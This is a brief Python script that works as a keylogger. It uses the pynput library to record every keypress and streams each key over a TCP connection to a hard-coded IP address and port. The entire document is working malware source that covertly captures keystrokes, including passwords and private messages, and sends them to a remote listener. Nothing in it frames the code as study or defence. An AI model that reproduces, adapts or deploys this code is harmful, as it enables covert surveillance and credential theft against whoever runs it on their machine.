import pynput.keyboard
import socket
PORT= 9080
HOST='192.168.18.127'
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT)) 
    while True: 
        def on_press(key):
            s.sendall(str(key).encode())
        listener = pynput.keyboard.Listener(on_press=on_press)
        with listener:
            listener.join()
            continue
